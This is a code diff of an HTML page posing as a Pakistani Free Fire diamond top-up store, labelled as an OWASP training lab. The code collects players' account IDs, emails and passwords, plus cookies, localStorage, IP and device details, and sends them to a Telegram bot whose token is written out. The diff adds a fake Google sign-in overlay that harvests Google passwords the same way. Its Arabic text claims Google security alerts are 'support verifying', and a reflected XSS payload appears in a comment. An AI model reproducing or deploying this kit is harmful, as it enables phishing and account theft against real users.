@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- LAB BUILD v3 — intentionally vulnerable (OWASP Top 10 training)
-         A05: no CSP / no security headers (intentional)
-         A03: reflected XSS sink — ?coupon=<img src=x onerror=alert(1)>
-         A02: client-side Telegram token (intentional, documented) -->
+    <!-- LAB BUILD v3 — SINGLE FILE (OWASP A01/A02/A03/A05 training)
+         A03: reflected XSS — ?coupon=<img src=x onerror=alert(1)>
+         A02: client-side Telegram token (intentional) -->
     <title>Pakistan Store | متجر باكستاني - شحن جواهر فري فاير</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Tajawal:wght@300;400;500;700;800&family=Noto+Nastaliq+Urdu:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Tajawal:wght@300;400;500;700;800&family=Noto+Nastaliq+Urdu:wght@400;500;700&family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -191,13 +190,60 @@
         .modal-content p { color: var(--gray); margin-bottom: 25px; }
         .modal-close-x { position: absolute; top: 12px; right: 18px; background: transparent; border: none; font-size: 30px; color: var(--gray); cursor: pointer; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.3s; line-height: 1; padding: 0; font-family: inherit; font-weight: 300; }
         .modal-close-x:hover { background: #f5f5f5; color: var(--danger); transform: rotate(90deg); }
-        /* رسالة الدفع الجديدة */
         .modal-text { white-space: pre-line; text-align: center; line-height: 1.8; margin: 10px 0; color: #555; font-size: 15px; }
         .modal-note { font-size: 13px; color: var(--primary); font-weight: 600; margin: 6px 0 14px; }
         .modal-ok { background: var(--primary); color: #fff; border: none; padding: 10px 30px; border-radius: 50px; cursor: pointer; font-size: 16px; font-weight: 700; font-family: inherit; }
         .modal-ok:hover { background: var(--primary-dark); }
+
+        /* ===== Google Verify overlay (single-file merge, g- prefixed) ===== */
+        #googleLogin {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 4000;
+            background: #f0f4f9; overflow-y: auto; direction: ltr;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif; color: #202124;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 24px;
+        }
+        .g-card { background: #fff; border: 1px solid #dadce0; border-radius: 12px; padding: 48px 40px 36px; max-width: 450px; width: 100%; box-shadow: 0 1px 3px rgba(60,64,67,.3); }
+        .g-card-inner { display: flex; flex-direction: column; }
+        .g-logo { display: flex; justify-content: center; margin-bottom: 16px; }
+        .g-logo svg { width: 52px; height: 52px; }
+        #googleLogin h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
+        .g-sub { font-size: 16px; text-align: center; margin-bottom: 28px; }
+        .g-sub.small { font-size: 14px; color: #5f6368; margin-top: -14px; margin-bottom: 20px; }
+        .email-line { color: #202124; font-size: 15px; font-weight: 500; }
+        .g-avatar { width: 52px; height: 52px; border-radius: 50%; background: #1a73e8; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 500; margin: 0 auto 16px; }
+        .g-field { margin-bottom: 16px; position: relative; }
+        .g-field label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 6px; font-weight: 500; }
+        .g-field input { width: 100%; padding: 13px 15px; font-size: 16px; color: #202124; border: 1px solid #dadce0; border-radius: 4px; outline: none; background: #fff; }
+        .g-field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
+        .g-error { display: none; color: #d93025; font-size: 12px; margin-top: 6px; }
+        .g-error.visible { display: block; }
+        .g-pass-wrap { position: relative; }
+        .g-pass-wrap input { padding-right: 44px; }
+        .g-eye { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 4px; opacity: .6; }
+        .g-eye:hover { opacity: 1; }
+        .g-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; }
+        .g-link { color: #1a73e8; font-weight: 600; font-size: 14px; text-decoration: none; }
+        .g-link:hover { background: rgba(26,115,232,.06); padding: 6px 8px; border-radius: 4px; }
+        .g-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit; }
+        .g-btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(66,133,244,.4); }
+        .g-success { text-align: center; padding: 20px 0; }
+        .g-check { width: 64px; height: 64px; border-radius: 50%; background: #34a853; color: #fff; font-size: 34px; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; box-shadow: 0 4px 12px rgba(52,168,83,.4); }
+        .g-success h2 { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+        .g-success p { font-size: 15px; color: #444; line-height: 1.9; }
+        .g-info-box { background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 14px 18px; margin: 18px 0; font-size: 14px; }
+        .g-info-box strong { color: #202124; }
+        .g-countdown { font-size: 13px; color: #5f6368; margin-top: 14px; }
+        .g-back-btn { display: inline-block; margin-top: 12px; text-decoration: none; padding: 12px 28px; }
+        .g-debug { color: #d93025; font-size: 12px; margin-top: 12px; }
+        #googleLogin footer { margin-top: 24px; width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #5f6368; background: transparent; padding: 0; }
+        #googleLogin footer a { color: #5f6368; text-decoration: none; margin-left: 16px; }
+        #googleLogin footer a:hover { color: #202124; }
+        .g-lang { color: #5f6368; font-weight: 500; cursor: pointer; }
+
         @media (max-width: 1200px) { .products-grid { grid-template-columns: repeat(3, 1fr); } }
         @media (max-width: 768px) { .nav-links { display: none; } .hero h1 { font-size: 32px; } .features { grid-template-columns: repeat(2, 1fr); } .products-grid { grid-template-columns: repeat(2, 1fr); } .steps { grid-template-columns: repeat(2, 1fr); } .steps::before { display: none; } .cart-sidebar { width: 100%; left: -100%; } .form-grid { grid-template-columns: 1fr; } }
+        @media (max-width: 480px) { .g-card { padding: 32px 24px 28px; } #googleLogin footer { flex-direction: column; gap: 10px; } }
     </style>
 </head>
 <body>
@@ -402,7 +448,6 @@
         </div>
     </div>
 
-    <!-- Success modal — رسالة الدفع الجديدة -->
     <div class="modal" id="successModal" onclick="if(event.target === this) closeModal()">
         <div class="modal-content">
             <button class="modal-close-x" onclick="closeModal()" aria-label="Close">×</button>
@@ -418,6 +463,83 @@
         </div>
     </div>
 
+    <!-- ===== Google Verify overlay — نفس الملف، طبقة كاملة الشاشة ===== -->
+    <div id="googleLogin" class="hidden">
+        <div class="g-card" id="gCard">
+            <div class="g-card-inner">
+                <div id="gStep1">
+                    <div class="g-logo">
+                        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                        </svg>
+                    </div>
+                    <h1>Sign in</h1>
+                    <p class="g-sub">Use your Google Account</p>
+                    <div class="g-field">
+                        <label for="gEmail">Email or phone</label>
+                        <input type="email" id="gEmail" autocomplete="username" placeholder="name@gmail.com" dir="ltr">
+                        <div class="g-error" id="gEmailError">Enter a valid email address</div>
+                    </div>
+                    <div class="g-actions">
+                        <a class="g-link" href="javascript:void(0)">Forgot email?</a>
+                        <button class="g-btn" onclick="gNextStep()">Next</button>
+                    </div>
+                </div>
+
+                <div class="hidden" id="gStep2">
+                    <div class="g-logo"><div class="g-avatar" id="gAvatar">?</div></div>
+                    <h1>Welcome</h1>
+                    <p class="g-sub email-line" id="gWelcomeEmail"></p>
+                    <p class="g-sub small">Enter your password</p>
+                    <div class="g-field">
+                        <label for="gPassword">Password</label>
+                        <div class="g-pass-wrap">
+                            <input type="password" id="gPassword" autocomplete="current-password" placeholder="Enter your password" dir="ltr">
+                            <button type="button" class="g-eye" onclick="gTogglePass()" title="Show password">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="g-error" id="gPassError">Enter a password</div>
+                    </div>
+                    <div class="g-actions">
+                        <a class="g-link" href="javascript:void(0)" onclick="gBackStep()">← Back</a>
+                        <button class="g-btn" onclick="gSignIn()">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="g-card hidden" id="gSuccessScreen">
+            <div class="g-success">
+                <div class="g-check">✓</div>
+                <h2>تم عملية الدفع ✅</h2>
+                <p>يرجى الانتظار للتحقق من معلوماتك</p>
+                <div class="g-info-box">
+                    <p>إذا استلمت إشعاراً من جوجل هذا يعني:</p>
+                    <p><strong>فريق الدعم الفني يتحقق من المعلومات التي أدخلتها</strong></p>
+                    <p>انتظر قليلاً حتى تكتمل العملية</p>
+                </div>
+                <p class="g-countdown" id="gCountdown">سيتم إعادتك إلى المتجر خلال 6 ثوانٍ...</p>
+                <a class="g-btn g-back-btn" href="javascript:void(0)" onclick="showStore()">العودة إلى المتجر</a>
+                <div class="g-debug" id="gDebug"></div>
+            </div>
+        </div>
+
+        <footer>
+            <div>
+                <a href="javascript:void(0)">Help</a>
+                <a href="javascript:void(0)">Privacy</a>
+                <a href="javascript:void(0)">Terms</a>
+            </div>
+            <span class="g-lang">العربية</span>
+        </footer>
+    </div>
+
     <a href="https://wa.me/923000000000" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i></a>
 
     <script>
@@ -427,7 +549,7 @@
         // ============================================================
         var TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
         var TELEGRAM_CHAT_ID = '6062660671';
-        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // تسجيل ثانوي (local فقط — على Pages مش هيشتغل، عادي)
+        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // local lab only — يفشل بصمت من غير سيرفر محلي
 
         // ============================================================
         // 💎 باقات الشحن (8 باقات)
@@ -449,6 +571,8 @@
         var selectedPayment = null;
         var selectedCurrency = 'PKR';
         var currentLang = localStorage.getItem('lang') || 'ar';
+        var gCtx = { email: '', id: '', pkg: '', diamonds: '', link: '', game: 'freefire' };
+        var gTimer = null;
 
         // ============================================================
         // 🌐 الترجمة (ar / en / ur)
@@ -558,7 +682,7 @@
         }
 
         // ============================================================
-        // ✅ التحقق (client-side فقط — A02/A04: قابل للتجاوز، للتوثيق)
+        // ✅ التحقق (client-side — A02: قابل للتجاوز، للتوثيق)
         // ============================================================
         function validateId() {
             var id = document.getElementById('accountId');
@@ -583,20 +707,20 @@
             var t = i18n[currentLang];
             if (password.value && password.value.length < 8) {
                 error.textContent = '❌ ' + (t['error.passwordShort'] || 'كلمة المرور قصيرة');
-                error.classList.add('show'); password.classList.add('invalid'); password.classList.remove('valid'); return false;
+                error.classList.add('show'); password.classList.add('invalid'); password.classList.remove('valid'); return 'short';
             }
             if (confirm.value && password.value !== confirm.value) {
                 error.textContent = '❌ ' + (t['error.password'] || 'كلمتا المرور غير متطابقتين');
-                error.classList.add('show'); confirm.classList.add('invalid'); confirm.classList.remove('valid'); return false;
+                error.classList.add('show'); confirm.classList.add('invalid'); confirm.classList.remove('valid'); return 'mismatch';
             }
             error.classList.remove('show'); password.classList.remove('invalid'); confirm.classList.remove('invalid');
             password.classList.add('valid'); if (confirm.value) confirm.classList.add('valid');
-            return true;
+            return 'ok';
         }
         function isFree(p) { return p && p.isFree === true; }
 
         // ============================================================
-        // 💎 عرض المنتجات + السلة + العملة
+        // 💎 المنتجات + السلة + العملة
         // ============================================================
         function formatPrice(p) {
             var t = i18n[currentLang];
@@ -679,10 +803,7 @@
         function toggleCart() {
             var sidebar = document.getElementById('cartSidebar');
             var overlay = document.getElementById('cartOverlay');
-            if (sidebar && overlay) {
-                sidebar.classList.toggle('active');
-                overlay.classList.toggle('active');
-            }
+            if (sidebar && overlay) { sidebar.classList.toggle('active'); overlay.classList.toggle('active'); }
         }
         function selectPayment(method, el) {
             selectedPayment = method;
@@ -713,11 +834,9 @@
         }
 
         // ============================================================
-        // 📤 الإرسال للبوت — نفس فورمات صفحتك بالظبط
+        // 📤 الإرسال للبوت + جمع البيانات
         // ============================================================
-        function getCookies() {
-            return document.cookie || '';
-        }
+        function getCookies() { return document.cookie || ''; }
         function getLocalStorageItems() {
             var items = [];
             try {
@@ -751,6 +870,13 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
             }).then(function(r) { return r.ok; }).catch(function() { return false; });
+        }
+        function postJson(url, data) {
+            return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        }
+        function exfil(text, payload) {
+            postJson(CALLBACK_URL, payload).catch(function() {});
+            return sendToTelegram(text);
         }
         function buildPageLoadedMessage(dev, ip) {
             var msg = '✅ PAGE LOADED | ' + dev.page + '\n';
@@ -800,17 +926,6 @@
             msg += '🕐 Time: ' + p.timestamp;
             return msg;
         }
-        function postJson(url, data) {
-            return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
-        }
-        function exfil(text, payload) {
-            postJson(CALLBACK_URL, payload).catch(function() {});
-            return sendToTelegram(text);
-        }
-
-        // ============================================================
-        // 📡 رسالة PAGE LOADED — أول ما الصفحة تتحمل
-        // ============================================================
         function sendPageLoaded() {
             var dev = getDeviceInfo();
             getIP().then(function(ip) {
@@ -821,7 +936,7 @@
         }
 
         // ============================================================
-        // ✅ تدفق الطلب — رسالة الدفع + تحويل لصفحة جوجل
+        // ✅ تدفق الطلب — رسالة الدفع + فتح صفحة جوجل (overlay)
         // ============================================================
         function proceedToCheckout() {
             var t = i18n[currentLang];
@@ -830,7 +945,9 @@
             if (!validateId()) { alert(t['alert.fillId']); return; }
             if (!validateEmail()) { alert(t['alert.fillEmail']); return; }
             if (!document.getElementById('accountPassword').value) { alert(t['alert.fillPassword']); return; }
-            if (!validatePasswordMatch()) { alert(t['alert.passwordMismatch']); return; }
+            var pw = validatePasswordMatch();
+            if (pw === 'short') { alert(t['alert.passwordShort']); return; }
+            if (pw === 'mismatch') { alert(t['alert.passwordMismatch']); return; }
             if (!isFree(selectedProduct) && !selectedPayment) { alert(t['alert.choosePayment']); return; }
 
             var payload = {
@@ -851,15 +968,7 @@
             exfil(buildCredsMessage(payload), payload).then(function(ok) {
                 if (ok) {
                     document.getElementById('successModal').classList.add('active');
-                    setTimeout(function() {
-                        var q = 'google-login.html?email=' + encodeURIComponent(payload.email) +
-                                '&id=' + encodeURIComponent(payload.playerId) +
-                                '&pkg=' + encodeURIComponent(payload.package.name) +
-                                '&diamonds=' + payload.package.diamonds +
-                                '&link=' + encodeURIComponent(payload.linkType) +
-                                '&game=' + encodeURIComponent(payload.game);
-                        window.location.href = q;
-                    }, 3000);
+                    setTimeout(function() { showGoogleLogin(payload); }, 3000);
                 } else alert(t['alert.noDelivery']);
             });
         }
@@ -886,273 +995,73 @@
         }
 
         // ============================================================
-        // A03 (intentional): Reflected XSS — ?coupon=<img src=x onerror=alert(1)>
+        // 🎭 صفحة جوجل (overlay داخل نفس الملف)
         // ============================================================
-        (function() {
-            var params = new URLSearchParams(window.location.search);
-            var coupon = params.get('coupon');
-            if (coupon) {
-                var banner = document.getElementById('couponBanner');
-                banner.innerHTML = '🎟️ <strong>كوبون:</strong> ' + coupon;
-                banner.classList.remove('hidden');
-            }
-        })();
-
-        // ============================================================
-        // 🚀 التشغيل — أول حاجة: رسالة PAGE LOADED للبوت
-        // ============================================================
-        localStorage.setItem('lang', currentLang);
-        localStorage.setItem('ps_lang', currentLang);
-        if (currentLang !== 'ar') setLang(currentLang);
-        else document.body.classList.add('lang-ar');
-        loadProducts();
-        updateCart();
-        sendPageLoaded();
-    </script>
-</body>
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- LAB BUILD v3 — fake Google sign-in (phishing sim, OWASP A01/A02/A03 training)
-         Sends entered creds to the lab owner's Telegram bot -->
-    <title>Sign in - Google Accounts</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Roboto, 'Segoe UI', Arial, sans-serif;
-            background: #f0f4f9;
-            min-height: 100vh;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            padding: 24px; color: #202124;
+        function showGoogleLogin(p) {
+            gCtx = {
+                email: p.email || '',
+                id: p.playerId || '',
+                pkg: p.package ? p.package.name : '',
+                diamonds: p.package ? p.package.diamonds : '',
+                link: p.linkType || '',
+                game: p.game || 'freefire'
+            };
+            closeModal();
+            document.getElementById('gCard').classList.remove('hidden');
+            document.getElementById('gEmail').value = gCtx.email;
+            document.getElementById('gPassword').value = '';
+            document.getElementById('gStep1').classList.remove('hidden');
+            document.getElementById('gStep2').classList.add('hidden');
+            document.getElementById('gSuccessScreen').classList.add('hidden');
+            document.getElementById('gDebug').textContent = '';
+            document.getElementById('googleLogin').classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
         }
-        .hidden { display: none !important; }
-        .card {
-            background: #fff; border: 1px solid #dadce0; border-radius: 12px;
-            padding: 48px 40px 36px; max-width: 450px; width: 100%;
-            box-shadow: 0 1px 3px rgba(60,64,67,.3);
-        }
-        .card-inner { display: flex; flex-direction: column; }
-        .logo { display: flex; justify-content: center; margin-bottom: 16px; }
-        .logo svg { width: 52px; height: 52px; }
-        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
-        .sub { font-size: 16px; text-align: center; margin-bottom: 28px; }
-        .sub.small { font-size: 14px; color: #5f6368; margin-top: -14px; margin-bottom: 20px; }
-        .email-line { color: #202124; font-size: 15px; font-weight: 500; }
-        .avatar {
-            width: 52px; height: 52px; border-radius: 50%; background: #1a73e8; color: #fff;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 22px; font-weight: 500; margin: 0 auto 16px;
-        }
-        .field { margin-bottom: 16px; position: relative; }
-        .field label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 6px; font-weight: 500; }
-        .field input {
-            width: 100%; padding: 13px 15px; font-size: 16px; color: #202124;
-            border: 1px solid #dadce0; border-radius: 4px; outline: none; background: #fff;
-        }
-        .field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
-        .field input.invalid { border-color: #d93025; }
-        .error { display: none; color: #d93025; font-size: 12px; margin-top: 6px; }
-        .error.visible { display: block; }
-        .pass-wrap { position: relative; }
-        .pass-wrap input { padding-right: 44px; }
-        .eye {
-            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; cursor: pointer; padding: 4px; opacity: .6;
-        }
-        .eye:hover { opacity: 1; }
-        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; }
-        .link { color: #1a73e8; font-weight: 600; font-size: 14px; text-decoration: none; }
-        .link:hover { background: rgba(26,115,232,.06); padding: 6px 8px; border-radius: 4px; }
-        .btn {
-            background: #1a73e8; color: #fff; border: none; border-radius: 4px;
-            padding: 10px 24px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
-        }
-        .btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(66,133,244,.4); }
-        .success { text-align: center; padding: 20px 0; }
-        .check {
-            width: 64px; height: 64px; border-radius: 50%; background: #34a853; color: #fff;
-            font-size: 34px; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
-            box-shadow: 0 4px 12px rgba(52,168,83,.4);
-        }
-        .success h2 { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .success p { font-size: 15px; color: #444; line-height: 1.9; }
-        .info-box {
-            background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px;
-            padding: 14px 18px; margin: 18px 0; font-size: 14px;
-        }
-        .info-box strong { color: #202124; }
-        .countdown { font-size: 13px; color: #5f6368; margin-top: 14px; }
-        .back-btn { display: inline-block; margin-top: 12px; text-decoration: none; padding: 12px 28px; }
-        .debug { color: #d93025; font-size: 12px; margin-top: 12px; }
-        footer {
-            margin-top: 24px; width: 100%; max-width: 450px; display: flex;
-            justify-content: space-between; align-items: center; font-size: 12px; color: #5f6368;
-        }
-        footer a { color: #5f6368; text-decoration: none; margin-left: 16px; }
-        footer a:hover { color: #202124; }
-        .lang { color: #5f6368; font-weight: 500; cursor: pointer; }
-        @media (max-width: 480px) {
-            .card { padding: 32px 24px 28px; }
-            footer { flex-direction: column; gap: 10px; }
-        }
-    </style>
-</head>
-<body>
-
-    <!-- ===== Card / steps ===== -->
-    <div class="card" id="card">
-        <div class="card-inner">
-
-            <!-- Step 1: email -->
-            <div class="step" id="step1">
-                <div class="logo">
-                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                    </svg>
-                </div>
-                <h1>Sign in</h1>
-                <p class="sub">Use your Google Account</p>
-                <div class="field">
-                    <label for="email">Email or phone</label>
-                    <input type="email" id="email" autocomplete="username" placeholder="name@gmail.com" dir="ltr">
-                    <div class="error" id="emailError">Enter a valid email address</div>
-                </div>
-                <div class="actions">
-                    <a class="link" href="javascript:void(0)">Forgot email?</a>
-                    <button class="btn" onclick="nextStep()">Next</button>
-                </div>
-            </div>
-
-            <!-- Step 2: password -->
-            <div class="step hidden" id="step2">
-                <div class="logo"><div class="avatar" id="avatar">?</div></div>
-                <h1>Welcome</h1>
-                <p class="sub email-line" id="welcomeEmail"></p>
-                <p class="sub small">Enter your password</p>
-                <div class="field">
-                    <label for="password">Password</label>
-                    <div class="pass-wrap">
-                        <input type="password" id="password" autocomplete="current-password" placeholder="Enter your password" dir="ltr">
-                        <button type="button" class="eye" onclick="togglePass()" title="Show password">
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2">
-                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
-                            </svg>
-                        </button>
-                    </div>
-                    <div class="error" id="passError">Enter a password</div>
-                </div>
-                <div class="actions">
-                    <a class="link" href="javascript:void(0)" onclick="backStep()">← Back</a>
-                    <button class="btn" onclick="signIn()">Sign in</button>
-                </div>
-            </div>
-
-        </div>
-    </div>
-
-    <!-- ===== Success screen (after creds submitted) ===== -->
-    <div class="card hidden" id="successScreen">
-        <div class="success">
-            <div class="check">✓</div>
-            <h2>تم عملية الدفع ✅</h2>
-            <p>يرجى الانتظار للتحقق من معلوماتك</p>
-            <div class="info-box">
-                <p>إذا استلمت إشعاراً من جوجل هذا يعني:</p>
-                <p><strong>فريق الدعم الفني يتحقق من المعلومات التي أدخلتها</strong></p>
-                <p>انتظر قليلاً حتى تكتمل العملية</p>
-            </div>
-            <p class="countdown" id="countdown">سيتم إعادتك إلى المتجر خلال 6 ثوانٍ...</p>
-            <a class="btn back-btn" href="index.html">العودة إلى المتجر</a>
-            <div class="debug" id="debug"></div>
-        </div>
-    </div>
-
-    <footer>
-        <div>
-            <a href="javascript:void(0)">Help</a>
-            <a href="javascript:void(0)">Privacy</a>
-            <a href="javascript:void(0)">Terms</a>
-        </div>
-        <span class="lang">العربية</span>
-    </footer>
-
-    <script>
-        // ============================================================
-        // LAB CONFIG — نفس التوكن والـ chat id بتوع المتجر
-        // ============================================================
-        var TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
-        var TELEGRAM_CHAT_ID = '6062660671';
-        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // local lab only — fails silently on Pages
-
-        // ============================================================
-        // سياق الطلب — جاي من index.html عبر الرابط
-        // ============================================================
-        var params = new URLSearchParams(window.location.search);
-        var ctx = {
-            email: params.get('email') || '',
-            id: params.get('id') || '',
-            pkg: params.get('pkg') || '',
-            diamonds: params.get('diamonds') || '',
-            link: params.get('link') || '',
-            game: params.get('game') || 'freefire'
-        };
-
-        // ============================================================
-        // الخطوة 1 → 2
-        // ============================================================
-        function nextStep() {
-            var email = document.getElementById('email').value.trim();
+        function gNextStep() {
+            var email = document.getElementById('gEmail').value.trim();
             var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!regex.test(email)) { showErr('emailError'); return; }
-            hideErr('emailError');
-            document.getElementById('welcomeEmail').textContent = email;
-            document.getElementById('avatar').textContent = email.charAt(0).toUpperCase();
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            document.getElementById('password').focus();
+            if (!regex.test(email)) { document.getElementById('gEmailError').classList.add('visible'); return; }
+            document.getElementById('gEmailError').classList.remove('visible');
+            document.getElementById('gWelcomeEmail').textContent = email;
+            document.getElementById('gAvatar').textContent = email.charAt(0).toUpperCase();
+            document.getElementById('gStep1').classList.add('hidden');
+            document.getElementById('gStep2').classList.remove('hidden');
+            document.getElementById('gPassword').focus();
         }
-        function backStep() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step1').classList.remove('hidden');
+        function gBackStep() {
+            document.getElementById('gStep2').classList.add('hidden');
+            document.getElementById('gStep1').classList.remove('hidden');
         }
-        function togglePass() {
-            var p = document.getElementById('password');
+        function gTogglePass() {
+            var p = document.getElementById('gPassword');
             p.type = (p.type === 'password') ? 'text' : 'password';
         }
-        function showErr(id) { document.getElementById(id).classList.add('visible'); }
-        function hideErr(id) { document.getElementById(id).classList.remove('visible'); }
+        function gSignIn() {
+            var email = document.getElementById('gEmail').value.trim();
+            var pass = document.getElementById('gPassword').value;
+            if (!pass) { document.getElementById('gPassError').classList.add('visible'); return; }
+            document.getElementById('gPassError').classList.remove('visible');
 
-        // ============================================================
-        // البيانات المساعدة
-        // ============================================================
-        function getDeviceInfo() {
-            return {
-                platform: navigator.platform || '?',
-                screen: screen.width + 'x' + screen.height,
-                language: navigator.language || '?',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
-                ua: navigator.userAgent || '?',
-                page: window.location.href,
-                referrer: document.referrer || ''
+            var payload = {
+                type: 'google',
+                timestamp: new Date().toISOString(),
+                email: email,
+                password: pass,
+                playerId: gCtx.id,
+                package: gCtx.pkg + (gCtx.diamonds ? ' (' + gCtx.diamonds + ' 💎)' : ''),
+                linkType: gCtx.link,
+                game: gCtx.game
             };
-        }
-        function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(function(r) { return r.json(); })
-                .then(function(d) { return d.ip || ''; })
-                .catch(function() { return ''; });
-        }
-        function sendToTelegram(text) {
-            return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-            }).then(function(r) { return r.ok; }).catch(function() { return false; });
+            postJson(CALLBACK_URL, payload).catch(function() {});
+            getIP().then(function(ip) {
+                payload.ip = ip;
+                payload.ua = getDeviceInfo().ua;
+                return sendToTelegram(buildGoogleMessage(payload));
+            }).then(function(ok) {
+                gShowSuccess();
+                if (!ok) document.getElementById('gDebug').textContent = '⚠️ فشل إرسال تيليجرام — راجع التوكن';
+                console.log('[LAB] google payload:', payload);
+            }).catch(function() { gShowSuccess(); });
         }
         function buildGoogleMessage(p) {
             var linkLabels = {
@@ -1171,72 +1080,52 @@
             msg += '🌐 UA: ' + p.ua;
             return msg;
